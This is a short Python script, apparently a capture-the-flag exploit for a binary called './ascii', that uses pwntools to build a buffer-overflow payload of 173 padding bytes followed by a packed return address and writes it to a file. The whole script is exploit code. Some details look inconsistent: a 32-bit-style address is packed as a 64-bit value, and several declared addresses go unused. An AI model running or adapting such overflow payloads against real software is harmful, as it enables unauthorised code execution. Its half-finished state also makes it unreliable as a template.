import struct
from pwn import *
#elf = ELF("./ascii")
#p = elf.process()

buffer_address = 0x80000000
puts = 0x8049a70
main = 0x08048f0e

buf = ""
buf += "A"*(173)
buf += struct.pack("<Q", main)

a = open("payload","w")
a.write(buf)

#p.sendline(buf+'\n')
